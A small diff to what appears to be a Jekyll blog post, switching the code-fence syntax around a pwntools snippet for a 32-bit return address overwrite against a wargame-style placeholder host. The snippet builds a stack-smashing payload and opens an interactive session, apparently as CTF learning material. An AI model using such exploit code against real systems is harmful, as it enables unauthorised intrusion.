@@ -10,7 +10,7 @@ layout: post
 
 **pwntools for Return Address Overwrite(x32)**
 
-{% highlight python %}
+~~~ python
 from pwn import *
 
 p = remote('example.pwnable.io', 8000)
@@ -23,7 +23,7 @@ payload = dummy + sfp + ret
 
 p.send(payload)
 p.interactive()
-{% endhighlight %}
+~~~
 
 <br>
 
